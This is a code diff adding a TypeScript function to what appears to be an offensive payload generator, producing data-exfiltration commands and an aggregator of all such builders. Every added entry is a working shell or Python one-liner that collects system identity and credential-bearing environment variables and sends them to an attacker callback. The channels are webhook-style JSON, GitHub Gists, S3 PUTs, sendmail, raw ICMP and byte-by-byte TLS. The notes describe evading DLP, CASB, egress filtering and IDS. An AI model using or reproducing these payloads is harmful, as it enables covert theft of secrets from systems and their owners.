@@ -545,3 +545,66 @@ export function buildInjectionReadyExfilWrapped(cbUrl: string, token: string): E
     },
   ];
 }
+
+export function buildWebhookExfil(cbUrl: string, token: string): ExfilPayload[] {
+  return [
+    { id:"slack_webhook_exfil", name:"Slack webhook data exfil", category:"Webhook-Exfil", technique:"http", os:"linux", stealth:3,
+      command:`_D=$(id&&hostname&&cat /proc/self/environ 2>/dev/null|tr '\\0' ' '|head -c3000); curl -sk -X POST "${cbUrl}/${token}" -H "Content-Type: application/json" -d "{\\"text\\":\\"$(echo $_D|head -c3000)\\"}" 2>/dev/null &`,
+      notes:"Data exfil disguised as Slack notification webhook. JSON body bypasses DLP text scanning." },
+    { id:"discord_webhook_exfil", name:"Discord webhook bot message exfil", category:"Webhook-Exfil", technique:"http", os:"linux", stealth:3,
+      command:`_D=$(id&&uname -a&&env|grep -iE '(pass|key|token|secret|api|cred)'); curl -sk -X POST "${cbUrl}/${token}" -H "Content-Type: application/json" -d "{\\"username\\":\\"svcbot\\",\\"embeds\\":[{\\"title\\":\\"status\\",\\"description\\":\\"$(echo $_D|head -c1800|sed 's/"/\\\\\\"/g')\\"}]}" 2>/dev/null &`,
+      notes:"Credential exfil in Discord embed format. Looks like bot status post to CASB/DLP." },
+    { id:"github_gist_exfil", name:"GitHub Gist anonymous exfil", category:"Cloud-Exfil", technique:"https", os:"linux", stealth:4,
+      command:`_D=$(id&&hostname&&cat /proc/self/environ 2>/dev/null|tr '\\0' '\\n'|grep -iE '(pass|key|token|secret)'|head -20); curl -sk -X POST "https://api.github.com/gists" -H "Content-Type: application/json" -d "{\\"public\\":false,\\"files\\":{\\"${token}.txt\\":{\\"content\\":\\"$(echo $_D|sed 's/"/\\\\"/g')\\"}},\\"description\\":\\"nx\\"}" 2>/dev/null &`,
+      notes:"Exfils secrets as private GitHub Gist. Content encrypted in transit, destination appears as github.com." },
+    { id:"s3_presigned_exfil", name:"AWS S3 presigned URL PUT exfil", category:"Cloud-Exfil", technique:"https", os:"linux", stealth:5,
+      command:`_D=$(cat /proc/self/environ 2>/dev/null|tr '\\0' '\\n'); curl -sk -X PUT "${cbUrl}/${token}/exfil_$(hostname)_$(date +%s).txt" -H "Content-Type: text/plain" --data-binary "$_D" 2>/dev/null &`,
+      notes:"PUT to pre-signed S3 URL — appears as legitimate S3 upload. TLS to amazonaws.com." },
+    { id:"smtp_exfil_linux", name:"SMTP email exfil (sendmail/curl)", category:"SMTP-Exfil", technique:"smtp", os:"linux", stealth:2,
+      command:`_D=$(id&&hostname&&env|grep -iE '(pass|key|token)'|head -20); (echo "From: svc@$(hostname)"; echo "To: ${token}"; echo "Subject: nx_$(date +%s)"; echo ""; echo "$_D") | sendmail -t 2>/dev/null &`,
+      notes:"Tries sendmail via local MTA. Internal SMTP relay often allows relay without auth." },
+    { id:"icmp_exfil_python", name:"ICMP echo payload exfil (Python root)", category:"ICMP-Exfil", technique:"icmp", os:"linux", stealth:5,
+      command:`python3 -c "
+import socket,struct,os,base64,time
+data=os.popen('id&&hostname&&env 2>/dev/null|head -20').read().encode()
+enc=base64.b32encode(data).decode().lower()
+s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+host='${cbUrl.replace(/https?:\/\//,'').split('/')[0] ?? cbUrl}'
+for i,chunk in enumerate([enc[j:j+28] for j in range(0,len(enc),28)]):
+  payload=chunk.encode()+b'\\x00'*(28-len(chunk))
+  pkt=struct.pack('!BBHHH',8,0,0,i,i)+payload
+  try: s.sendto(pkt,(host,0))
+  except: pass
+  time.sleep(0.1)
+" 2>/dev/null &`,
+      notes:"ICMP echo request payload carries b32-encoded exfil data. Bypasses all TCP/UDP egress rules. Requires root/CAP_NET_RAW." },
+    { id:"slow_http_exfil", name:"Slow HTTP exfil (anti-IDS chunked)", category:"Stealth-HTTP", technique:"http", os:"linux", stealth:5,
+      command:`python3 -c "
+import socket,ssl,time,random,base64,os
+data=base64.b64encode(os.popen('id&&hostname&&cat /proc/self/environ 2>/dev/null').read().encode()).decode()
+host='${cbUrl.replace(/https?:\/\//,'').split('/')[0] ?? cbUrl}'
+ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
+s=ctx.wrap_socket(socket.socket(),server_hostname=host)
+s.connect((host,443))
+hdrs='POST /${token} HTTP/1.1\\r\\nHost: '+host+'\\r\\nContent-Length: '+str(len(data))+'\\r\\n\\r\\n'
+s.send(hdrs.encode())
+for c in data:
+  s.send(c.encode())
+  time.sleep(random.uniform(0.05,0.25))
+s.close()
+" 2>/dev/null &`,
+      notes:"Sends body 1 byte at a time with random 50-250ms delay. Mimics human typing. Anti-IDS: content reassembly timeout defeats signature matching." },
+  ];
+}
+
+export function buildAllExfilPayloads(cbUrl: string, token: string): ExfilPayload[] {
+  return [
+    ...buildHttpExfil(cbUrl, token),
+    ...buildDnsExfil(cbUrl, token),
+    ...buildWindowsExfil(cbUrl, token),
+    ...buildSsrfExfil(cbUrl, token),
+    ...buildInjectionReadyExfilWrapped(cbUrl, token),
+    ...buildWebhookExfil(cbUrl, token),
+  ];
+}
